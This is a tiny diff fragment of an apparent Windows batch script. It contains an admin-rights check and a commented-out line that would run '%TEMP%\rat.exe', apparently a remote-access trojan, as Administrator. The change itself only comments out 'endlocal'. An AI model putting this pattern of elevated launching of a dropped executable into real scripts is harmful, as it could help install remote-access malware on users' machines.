@@ -12,4 +12,4 @@ fltmc >nul 2>&1 && (
 
 ::start /B "" runas /user:Administrator "%TEMP%\rat.exe"
 
-endlocal
+::endlocal
